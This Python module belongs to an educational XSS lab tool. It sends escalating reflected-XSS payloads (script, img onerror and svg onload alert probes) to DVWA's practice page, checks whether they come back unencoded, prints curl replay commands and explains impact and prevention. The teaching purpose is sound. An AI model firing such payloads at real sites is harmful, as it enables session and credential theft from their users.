"""
Reflected XSS module for XSS Lab Tool.
Demonstrates and teaches reflected (non-persistent) XSS attacks.
"""

import shlex
import textwrap
from typing import Optional, List, Tuple
from ..explanations.text_blocks import XSSExplanations


class ReflectedXSSModule:
    """Interactive module for teaching Reflected XSS."""

    def __init__(self, http_client, logger, target_config):
        """
        Initialize Reflected XSS module.

        Args:
            http_client: HTTPClient instance
            logger: DualLogger instance
            target_config: TargetConfig instance
        """
        self.http = http_client
        self.logger = logger
        self.config = target_config
        self.explanations = XSSExplanations()

        # DVWA reflected XSS page path
        self.xss_reflected_path = "vulnerabilities/xss_r/"

        # Payloads in order of escalation
        self.payloads = [
            ("<script>alert(1)</script>", "PAYLOAD_BASIC_ALERT"),
            ("<img src=x onerror=alert(1)>", "PAYLOAD_IMG_ONERROR"),
            ("<svg/onload=alert(1)>", "PAYLOAD_SVG_ONLOAD"),
        ]
        self._injection_details_logged = False

    def run_interactive(self, interactive: bool = True) -> bool:
        """
        Run the reflected XSS module interactively.

        Args:
            interactive: If True, pause for user confirmation at key steps

        Returns:
            True if at least one payload succeeded
        """
        self.logger.educational("", "REFLECTED XSS MODULE")
        self.logger.educational(self.explanations.REFLECTED_XSS_INTRO)

        # Step 1: Introduce the vulnerability
        self.logger.step(
            1,
            "Understanding the Target",
            "We're going to examine DVWA's Reflected XSS page. This page takes a 'name' "
            "parameter and displays it back to the user without proper sanitization."
        )

        if interactive and not self._get_user_approval("Proceed to examine the vulnerable page?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 2: Send benign request to show reflection
        self.logger.step(
            2,
            "Testing Normal Behavior",
            "First, let's send a normal, non-malicious input to see how the page behaves."
        )

        url = self.config.get_dvwa_url(self.xss_reflected_path)
        test_input = "TestUser123"

        response = self.http.get(url, params={'name': test_input})

        if not response:
            self.logger.explain_failure(
                "Failed to reach target page",
                "The HTTP request to the reflected XSS page failed. This could be due to:\n"
                "  - DVWA not running\n"
                "  - Incorrect URL\n"
                "  - Network connectivity issues",
                "Verify DVWA is running and accessible"
            )
            return False

        if test_input in response.text:
            self.logger.educational(f"\n✓ Input '{test_input}' was reflected in the response")
            self.logger.educational(
                "This means the server is taking our input and including it directly in the HTML.\n"
                "If it's not encoded properly, we can inject malicious code."
            )
        else:
            self.logger.educational(
                f"\n⚠ Expected input '{test_input}' not found in response.\n"
                "The page structure may have changed, or security level may be too high."
            )

        if not self._injection_details_logged:
            self._log_injection_breakdown()
            self._injection_details_logged = True

        if interactive and not self._get_user_approval("\nProceed to attempt XSS payloads?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 3: Explain impact before attempting
        self.logger.educational(self.explanations.REFLECTED_XSS_IMPACT)

        # Step 4: Attempt payloads
        success = False
        for i, (payload, explanation_key) in enumerate(self.payloads, start=1):
            if self._attempt_payload(payload, explanation_key, i, interactive):
                success = True
                break

        # Step 5: Prevention education
        if success:
            self.logger.educational("\n" + "="*70)
            self.logger.educational(self.explanations.REFLECTED_XSS_PREVENTION)

        return success

    def _attempt_payload(self, payload: str, explanation_key: str, attempt_num: int, interactive: bool) -> bool:
        """
        Attempt a single XSS payload.

        Args:
            payload: The XSS payload to try
            explanation_key: Key for payload explanation
            attempt_num: Attempt number for display
            interactive: Whether to ask for confirmation

        Returns:
            True if payload succeeded
        """
        self.logger.step(
            3 + attempt_num,
            f"Attempting Payload {attempt_num}",
            f"Let's try injecting malicious JavaScript using this payload:"
        )

        # Show and explain payload
        explanation = self.explanations.get_explanation(explanation_key)
        self.logger.payload(payload, explanation)

        if interactive and not self._get_user_approval(f"\nExecute this payload?"):
            self.logger.educational("Payload skipped by user.\n")
            return False

        # Execute the payload
        url = self.config.get_dvwa_url(self.xss_reflected_path)
        params = {'name': payload}
        self._log_curl_examples("GET", url, params=params)
        response = self.http.get(url, params=params)

        if not response:
            self.logger.explain_failure(
                f"HTTP request failed for payload {attempt_num}",
                "Could not connect to target",
                "Check DVWA connectivity"
            )
            return False

        # Check if payload succeeded
        if self.http.check_xss_reflection(response, payload):
            self.logger.explain_success(
                f"Payload {attempt_num} succeeded!",
                f"The payload '{payload}' appeared unencoded in the HTML response. "
                f"This means a browser would execute it as JavaScript code.\n\n"
                f"In a real attack scenario:\n"
                f"  1. Attacker sends victim a link with this payload\n"
                f"  2. Victim clicks the link\n"
                f"  3. Server reflects the payload in response\n"
                f"  4. Victim's browser executes malicious JavaScript\n"
                f"  5. Attacker can steal cookies, credentials, or perform actions as victim"
            )
            self._log_http_evidence(response, payload, "reflected payload inside HTML body")
            return True
        else:
            self.logger.explain_failure(
                f"Payload {attempt_num} was blocked or encoded",
                "The payload did not appear in its original form in the response. "
                "This suggests the application is either:\n"
                "  - Encoding special characters (< becomes &lt;)\n"
                "  - Filtering/removing dangerous strings\n"
                "  - Operating at a higher security level",
                f"Try a different payload that may bypass the filter" if attempt_num < len(self.payloads) else None
            )

            # Show snippet of how it was encoded/blocked
            self._log_http_evidence(response, payload, "encoded or blocked response sample")

        return False

    def _log_injection_breakdown(self):
        """Describe where the payload lands (headers vs body)."""
        url = self.config.get_dvwa_url(self.xss_reflected_path)
        breakdown = [
            f"Target endpoint: {url}",
            "HTTP method: GET (query string).",
            "Parameter: `name` (reflected without encoding).",
            "Injection surface: HTML body inside the greeting <pre> block.",
            "Headers: untouched – only the response body is tainted.",
        ]
        message = "Injection breakdown:\n" + "\n".join(f"  - {line}" for line in breakdown)
        self.logger.educational(message)

    def _log_curl_examples(
        self,
        method: str,
        url: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
    ):
        """Show users how to replay the request with curl (direct & Burp proxy)."""
        direct = self._build_curl_command(method, url, params, data, use_proxy=False)
        burp = self._build_curl_command(method, url, params, data, use_proxy=True)
        self.logger.educational(
            "Reproduce this request via curl:\n"
            f"  direct : {direct}\n"
            f"  via Burp: {burp}\n"
        )

    def _build_curl_command(
        self,
        method: str,
        url: str,
        params: Optional[dict],
        data: Optional[dict],
        use_proxy: bool,
    ) -> str:
        """Build a curl command string with optional Burp proxy flag."""
        parts = ["curl", "-sS"]
        if use_proxy:
            parts.extend(["--proxy", "http://127.0.0.1:8080"])

        if method.upper() == "GET":
            parts.extend(["-G", shlex.quote(url)])
            for key, value in (params or {}).items():
                safe_value = str(value).replace("\n", "\\n")
                parts.extend(["--data-urlencode", shlex.quote(f"{key}={safe_value}")])
        else:
            parts.extend(["-X", method.upper(), shlex.quote(url)])
            for key, value in (data or {}).items():
                safe_value = str(value).replace("\n", "\\n")
                parts.extend(["-d", shlex.quote(f"{key}={safe_value}")])

        return " ".join(parts)

    def _log_http_evidence(self, response, payload: str, note: str):
        """Print HTTP status, headers, and the body excerpt with payload markers."""
        snippet, hint = self._extract_payload_snippet(response.text, payload)
        interesting_headers = []
        for header in ["Content-Type", "Server", "Date"]:
            if header in response.headers:
                interesting_headers.append(f"{header}: {response.headers[header]}")

        header_text = "\n".join(f"  {line}" for line in interesting_headers) or "  (no headers sampled)"
        body_text = textwrap.indent(snippet, "    ")

        self.logger.educational(
            f"HTTP evidence ({note}):\n"
            f"  Status: {response.status_code}\n"
            f"{header_text}\n"
            f"  Body excerpt ({hint}):\n{body_text}\n"
        )

    def _extract_payload_snippet(self, body: str, payload: str, radius: int = 160):
        """Return a snippet around the payload (or the start of the body)."""
        index = body.find(payload)
        if index == -1:
            snippet = body[:radius] or "(empty response body)"
            return snippet.strip(), "payload not present; showing leading bytes"

        start = max(index - radius // 2, 0)
        end = min(index + len(payload) + radius // 2, len(body))
        snippet = body[start:end].replace(payload, f"<<PAYLOAD>>{payload}<<PAYLOAD>>")
        return snippet.strip(), "payload highlighted with <<PAYLOAD>> markers"

    def _get_user_approval(self, prompt: str) -> bool:
        """
        Ask user for approval to proceed.

        Args:
            prompt: Prompt to display

        Returns:
            True if user approves, False otherwise
        """
        try:
            response = input(f"\n{prompt} [y/N]: ").strip().lower()
            self.logger.operational(f"User response to '{prompt}': {response}", "INFO")
            return response in ['y', 'yes']
        except (KeyboardInterrupt, EOFError):
            self.logger.operational("User interrupted", "INFO")
            return False

    def get_target_url(self) -> str:
        """Get the full URL for the reflected XSS page."""
        return self.config.get_dvwa_url(self.xss_reflected_path)
